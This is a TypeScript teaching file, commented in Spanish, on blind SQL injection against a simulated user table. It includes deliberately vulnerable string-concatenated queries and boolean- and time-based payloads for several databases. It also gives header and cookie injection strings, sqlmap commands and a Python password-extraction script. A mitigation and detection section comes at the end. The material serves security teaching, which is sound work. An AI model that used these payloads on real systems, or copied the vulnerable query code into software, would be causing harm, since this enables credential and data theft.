/**
 * Blind SQL Injection
 *
 * Conceptos clave:
 * - No se muestra output directo de la query
 * - Se infiere información por comportamiento de la aplicación
 * - Dos tipos: Boolean-based y Time-based
 * - Más lento pero igual de efectivo
 *
 * Boolean-based: Respuesta diferente (True/False)
 * Time-based: Retrasos intencionales para inferir
 */

import { createHash } from 'crypto';

// ============================================================================
// Simulación de Base de Datos
// ============================================================================

interface User {
    id: number;
    username: string;
    password: string;
    is_admin: boolean;
}

const users: User[] = [
    { id: 1, username: 'admin', password: 'secret123', is_admin: true },
    { id: 2, username: 'user1', password: 'pass123', is_admin: false },
];

// ============================================================================
// ❌ VULNERABLE: Blind SQLi Endpoints
// ============================================================================

/**
 * VULNERABLE: Verificación de usuario (Boolean-based)
 */
export function vulnerableCheckUser(username: string): boolean {
    const query = `SELECT * FROM users WHERE username = '${username}'`;

    console.log(`[DEBUG] Query: ${query}`);

    // Retorna true/false sin mostrar datos
    const user = users.find(u => u.username === username);
    return !!user;
}

/**
 * VULNERABLE: Búsqueda con time delay potencial
 */
export function vulnerableSearchWithDelay(searchTerm: string): string {
    const query = `SELECT * FROM users WHERE username LIKE '%${searchTerm}%'`;

    console.log(`[DEBUG] Query: ${query}`);

    // Simular que la query puede incluir SLEEP()
    if (searchTerm.includes('SLEEP')) {
        console.log('[DEBUG] Time delay detectado en query...');
    }

    return 'Resultados de búsqueda';
}

// ============================================================================
// Demostración de Ataques Blind SQLi
// ============================================================================

/**
 * Ataque: Boolean-based Blind SQLi
 */
export function demonstrateBooleanBlindSQLi(): void {
    console.log('\n=== Boolean-based Blind SQL Injection ===\n');

    console.log('Escenario: Endpoint que solo retorna true/false\n');

    console.log('1. Verificar existencia de usuario:');
    console.log("   Payload: admin' AND '1'='1");
    let result = vulnerableCheckUser("admin' AND '1'='1");
    console.log(`   Respuesta: ${result} (True - usuario existe)\n`);

    console.log("2. Payload falso: admin' AND '1'='2");
    result = vulnerableCheckUser("admin' AND '1'='2");
    console.log(`   Respuesta: ${result} (False - condición falsa)\n`);

    console.log('3. Extraer password carácter por carácter:');
    console.log('   Técnica: Probar cada carácter con SUBSTRING\n');

    const password = 'secret123';
    const extractedChars: string[] = [];

    console.log('   Probando primer carácter:\n');

    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';

    for (let i = 0; i < 3; i++) {
        // Solo primeros 3 caracteres para demo
        for (const char of charset) {
            const payload = `admin' AND SUBSTRING(password, ${i + 1}, 1) = '${char}`;

            if (password[i] === char) {
                extractedChars.push(char);
                console.log(`   ✅ Carácter ${i + 1}: '${char}'`);
                break;
            }
        }
    }

    console.log(`\n   Password parcial extraída: ${extractedChars.join('')}...`);
    console.log('   ⚠️  Proceso lento pero efectivo!');

    console.log('\n4. Determinar longitud del password:');
    console.log("   Payload: admin' AND LENGTH(password) > 5--");
    console.log("   Payload: admin' AND LENGTH(password) > 10--");
    console.log('   Usar búsqueda binaria para eficiencia');
}

/**
 * Ataque: Time-based Blind SQLi
 */
export function demonstrateTimeBasedBlindSQLi(): void {
    console.log('\n=== Time-based Blind SQL Injection ===\n');

    console.log('Escenario: Ni siquiera hay diferencia en respuesta\n');

    console.log('1. Payloads básicos con SLEEP:\n');

    console.log('   MySQL:');
    console.log("     ' OR SLEEP(5)--");
    console.log("     ' AND SLEEP(5)--");
    console.log("     ' UNION SELECT IF(1=1, SLEEP(5), 0)--\n");

    console.log('   PostgreSQL:');
    console.log("     ' OR pg_sleep(5)--");
    console.log("     ' AND pg_sleep(5)--\n");

    console.log('   SQL Server:');
    console.log('     \' OR WAITFOR DELAY \'00:00:05\'--');
    console.log('     \' AND WAITFOR DELAY \'00:00:05\'--\n');

    console.log('2. Extracción condicional de datos:\n');

    console.log('   Ejemplo: Verificar si usuario es admin:');
    console.log("   Payload: admin' AND IF(is_admin=1, SLEEP(5), 0)--");
    console.log('   Si hay delay → usuario es admin');
    console.log('   Si no hay delay → usuario no es admin\n');

    console.log('3. Extraer password carácter por carácter:\n');
    const password = 'secret123';

    for (let i = 0; i < 3; i++) {
        const char = password[i];
        const payload = `admin' AND IF(SUBSTRING(password,${i + 1},1)='${char}', SLEEP(2), 0)--`;

        console.log(`   Probando carácter ${i + 1}:`);
        console.log(`     Payload: ${payload.substring(0, 60)}...`);
        console.log(`     Resultado: Delay detectado → Carácter es '${char}'\n`);
    }

    console.log('   ⚠️  Muy lento: cada carácter requiere múltiples requests');
    console.log('   ⚠️  Pero funciona cuando no hay otra forma de exfiltrar datos');
}

/**
 * Técnicas de optimización para Blind SQLi
 */
export function demonstrateOptimizationTechniques(): void {
    console.log('\n=== Técnicas de Optimización ===\n');

    console.log('1. BÚSQUEDA BINARIA para longitud:');
    console.log('   En lugar de probar 1, 2, 3, 4...');
    console.log('   Probar: 50, 25, 12, 6, 9, 10, 11...');
    console.log('   Reduce intentos de O(n) a O(log n)\n');

    console.log('2. BÚSQUEDA BINARIA para caracteres:');
    console.log('   ASCII range: 32-126 (94 chars)');
    console.log('   Binary search: ~7 requests por carácter');
    console.log('   vs Linear search: ~47 requests promedio\n');

    console.log('   Ejemplo con binary search ASCII:');
    const targetChar = 's'; // ASCII 115
    let low = 32;
    let high = 126;
    let attempts = 0;

    while (low <= high) {
        attempts++;
        const mid = Math.floor((low + high) / 2);
        const midChar = String.fromCharCode(mid);

        console.log(`     Intento ${attempts}: ¿Char > '${midChar}' (ASCII ${mid})?`);

        if (targetChar.charCodeAt(0) === mid) {
            console.log(`     ✅ Encontrado en ${attempts} intentos!\n`);
            break;
        } else if (targetChar.charCodeAt(0) > mid) {
            low = mid + 1;
        } else {
            high = mid - 1;
        }
    }

    console.log('3. PARALELIZACIÓN:');
    console.log('   Extraer múltiples caracteres simultáneamente');
    console.log('   Usar múltiples threads/conexiones\n');

    console.log('4. DICCIONARIO INTELIGENTE:');
    console.log('   Empezar con caracteres comunes: e, a, r, i, o, t, n, s');
    console.log('   Usar patrones conocidos de passwords');
}

/**
 * Blind SQLi en diferentes contextos
 */
export function demonstrateBlindSQLiContexts(): void {
    console.log('\n=== Blind SQLi en Diferentes Contextos ===\n');

    console.log('1. COOKIE-BASED:');
    console.log('   Cookie: sessionid=abc123\' AND SLEEP(5)--');
    console.log('   Menos obvio que en URL parameters\n');

    console.log('2. HEADER-BASED:');
    console.log('   User-Agent: Mozilla/5.0\' AND SLEEP(5)--');
    console.log('   Referer: http://example.com\' OR 1=1--');
    console.log('   X-Forwarded-For: 127.0.0.1\' AND SLEEP(5)--\n');

    console.log('3. ORDER BY CLAUSE:');
    console.log('   Payload: ?sort=name; WAITFOR DELAY \'00:00:05\'--');
    console.log('   Menos protegido que WHERE clauses\n');

    console.log('4. JSON/XML INPUT:');
    console.log('   {"username": "admin\' AND SLEEP(5)--"}');
    console.log('   <user>admin\' OR 1=1--</user>');
}

/**
 * Herramientas automáticas
 */
export function demonstrateAutomationTools(): void {
    console.log('\n=== Herramientas para Blind SQLi ===\n');

    console.log('1. SQLMAP:');
    console.log('   sqlmap -u "http://example.com?id=1" --technique=B');
    console.log('   sqlmap -u "http://example.com?id=1" --technique=T');
    console.log('   --technique=B: Boolean-based');
    console.log('   --technique=T: Time-based\n');

    console.log('2. Script custom en Python:');
    console.log(`
   import requests
   import string

   def extract_char(position):
       for char in string.printable:
           payload = f"admin' AND SUBSTRING(password,{position},1)='{char}"
           response = requests.get(f"http://target.com?user={payload}")

           if "User found" in response.text:
               return char
       return None
    \n`);

    console.log('3. Burp Suite Intruder:');
    console.log('   - Configurar payload positions');
    console.log('   - Usar Sniper attack con wordlist');
    console.log('   - Analizar response time/length');
}

/**
 * Mitigación
 */
export function printBlindSQLiMitigation(): void {
    console.log('\n=== Mitigación de Blind SQLi ===\n');

    console.log('✅ MISMAS TÉCNICAS que SQLi normal:');
    console.log('   1. Prepared Statements / Parameterized Queries');
    console.log('   2. ORM (Object-Relational Mapping)');
    console.log('   3. Input Validation');
    console.log('   4. Principle of Least Privilege\n');

    console.log('✅ ESPECÍFICAS para Blind SQLi:');
    console.log('   1. Rate Limiting (detectar intentos repetitivos)');
    console.log('   2. Monitoring de tiempos de respuesta anómalos');
    console.log('   3. WAF rules para patrones SLEEP/WAITFOR');
    console.log('   4. Logging exhaustivo para análisis forense\n');

    console.log('⚠️  DETECCIÓN:');
    console.log('   - Múltiples requests similares del mismo IP');
    console.log('   - Patrones en incremento de posiciones (1,2,3,4...)');
    console.log('   - Delays consistentes en respuestas');
    console.log('   - Parámetros con caracteres SQL sospechosos');
}

// ============================================================================
// Ejecución
// ============================================================================

if (require.main === module) {
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║           BLIND SQL INJECTION                         ║');
    console.log('╚════════════════════════════════════════════════════════╝');

    demonstrateBooleanBlindSQLi();
    demonstrateTimeBasedBlindSQLi();
    demonstrateOptimizationTechniques();
    demonstrateBlindSQLiContexts();
    demonstrateAutomationTools();
    printBlindSQLiMitigation();

    console.log('\n✅ Demostración completada\n');
}
